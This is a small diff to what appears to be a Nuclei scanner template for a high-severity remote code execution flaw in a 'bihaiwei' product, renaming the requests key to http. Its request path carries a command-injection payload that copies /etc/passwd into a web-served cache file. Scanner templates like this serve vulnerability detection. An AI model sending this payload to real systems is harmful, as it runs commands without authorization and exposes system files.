@@ -6,7 +6,7 @@ info:
   severity: high
   tags: bihaiwei,rce
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/notice/jumper.php?t=;cp+/etc/passwd+/www/report/cache/1a2.txt||echo&u=xYOJFKCwSZ"
